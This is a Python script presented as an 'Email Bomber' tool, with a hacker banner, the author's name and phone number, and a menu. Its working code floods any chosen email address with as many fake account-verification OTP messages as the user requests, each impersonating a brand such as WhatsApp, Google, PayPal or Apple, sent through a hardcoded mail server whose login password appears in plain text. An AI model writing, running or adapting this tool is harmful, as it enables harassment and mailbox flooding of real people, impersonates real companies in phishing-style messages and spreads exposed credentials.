import smtplib
import random
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import random
import string

# Function to print hacker-style banner
def print_hacker_banner():
    os.system('cls' if os.name == 'nt' else 'clear')  # Only clear at the start
    print("\033[1;31;40m")  # Red color for the banner
    print("""
  ____                  _               
 |  _ \                | |              
 | |_) | ___  _ __ ___ | |__   ___ _ __ 
 |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|
 | |_) | (_) | | | | | | |_) |  __/ |   
 |____/ \___/|_| |_| |_|_.__/ \___|_|   
                                        
    """)
    print("\033[0m")  # Reset the color after the banner

    # Box with multi-colored text below the banner
    print("\033[1;32;40m")  # Green color for the box
    print("╔═════════════════════════════════════════╗")
    print("\033[1;34;40m" + "║ " + "\033[1;33;40m" + "Author Name : Babar Ali" +           "\033[1;34;40m" +           " ║")
    print("\033[1;34;40m" + "║ " + "\033[1;33;40m" + "Whatsapp Number : +923000448415"           + "\033[1;34;40m" +           " ║")
    print("╚═════════════════════════════════════════╝")
    print("\033[0m")  # Reset the color after the box

    print("\033[1;33;40m")
    print("Welcome to the Bomber Tool")
    print("Choose an option:")
    print("1. Email Bomber")
    print("2. SMS Bomber (Dummy)")
    print("3. Exit")
    print("\033[0m")
    time.sleep(1)

# SMTP server details
SMTP_SERVER = 'mail.royalearninghub.click'
SMTP_PORT = 587
SENDER_EMAIL = 'noreply@royalearninghub.click'  # Apna email daalein
SENDER_PASSWORD = '+bUtR?g=)p+2'  # Apna password ya app-specific password

# Function to generate random OTP
def generate_otp():
    otp = ''.join(random.choices(string.digits, k=6))  # Random 6-digit OTP
    return otp

# List of 100 companies including popular tech, social media, and other brands
companies = [
    "TechCorp", "FinSolve", "InnoSys", "XenoTech", "GlobalX", "SoftWare Solutions", "Alpha Inc.",
    "WhatsApp", "Facebook", "Instagram", "Google", "Amazon", "Apple", "Microsoft", "Twitter", "Snapchat",
    "LinkedIn", "YouTube", "TikTok", "Pinterest", "Reddit", "Spotify", "Netflix", "Uber", "Airbnb",
    "PayPal", "eBay", "Shopify", "Slack", "Zoom", "Dropbox", "Salesforce", "Tesla", "SpaceX",
    "Dell", "HP", "Lenovo", "Asus", "Nvidia", "AMD", "Intel", "Qualcomm", "Cisco", "Samsung",
    "Huawei", "Sony", "LG", "Panasonic", "Bose", "Fitbit", "GoPro", "Nikon", "Canon", "Fujifilm",
    "Adobe", "Autodesk", "VMware", "Oracle", "SAP", "Adobe Systems", "Spotify", "Pinterest", "Spotify",
    "WordPress", "Trello", "Zoom Video Communications", "GitHub", "Bitbucket", "GitLab", "Docker", "Kubernetes",
    "Atlassian", "Shopify", "Stripe", "Airbnb", "Uber Eats", "GrubHub", "DoorDash", "Instacart", "Postmates",
    "WeWork", "Slack Technologies", "Xero", "Squarespace", "BigCommerce", "Wix", "Bluehost", "GoDaddy",
    "Shopify", "Vimeo", "Yelp", "Expedia", "Booking.com", "Hulu", "Disney", "WarnerMedia", "Fox",
    "NBCUniversal", "CNN", "BBC", "The New York Times", "The Washington Post", "Bloomberg", "Forbes",
    "McKinsey & Company", "Boston Consulting Group", "Deloitte", "PwC", "Ernst & Young", "KPMG", "Accenture"
]

# Function to send email
def send_email(receiver_email, num_emails):
    success_count = 0  # To track the number of successfully sent emails
    failure_count = 0  # To track the number of failed emails
    
    # Start sending emails
    for _ in range(num_emails):
        # Select random company and generate OTP
        company = random.choice(companies)
        otp = generate_otp()
        
        # Generate random email content
        subject = f"Account Verification - {company}"
        body = f"Hello,\n\nPlease verify your account using the following OTP for {company}:\n\nOTP: {otp}\n\nThank you for using our service!"
        
        # Create the email message
        message = MIMEMultipart()
        message['From'] = SENDER_EMAIL
        message['To'] = receiver_email
        message['Subject'] = subject
        message.attach(MIMEText(body, 'plain'))
        
        # Connect to the SMTP server
        try:
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.starttls()  # Secure connection
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL, receiver_email, message.as_string())
            server.quit()
            success_count += 1  # Increment success count
            print(f"Email sent successfully to {receiver_email}")
        except Exception as e:
            failure_count += 1  # Increment failure count
            print(f"Failed to send email to {receiver_email}: {e}")
    
    # Display success and failure counts
    print(f"\nEmails sent successfully: {success_count}")
    print(f"Emails failed to send: {failure_count}")
    
    # Provide options to the user
    print("\nChoose an option:")
    print("1. Back")
    print("2. Exit")
    choice = input("Enter your choice: ")
    
    if choice == "1":
        return True  # Go back to the main menu
    elif choice == "2":
        exit()  # Exit the program
    else:
        print("Invalid choice! Exiting...")
        exit()  # Exit if an invalid choice is made

# Main function to handle user input and choices
def main():
    while True:
        print_hacker_banner()
        choice = input("Enter your choice: ")
        
        if choice == "1":  # Email Bomber
            receiver_email = input("Enter the receiver's email address: ")
            num_emails = int(input("Enter the number of emails to send: "))
            send_email(receiver_email, num_emails)
        elif choice == "2":  # SMS Bomber (Dummy)
            print("SMS Bomber (Dummy) is under construction.")
            time.sleep(1)
        elif choice == "3":  # Exit
            print("Exiting program...")
            exit()
        else:
            print("Invalid choice! Please try again.")
            time.sleep(1)

# Run the program
if __name__ == "__main__":
    main()
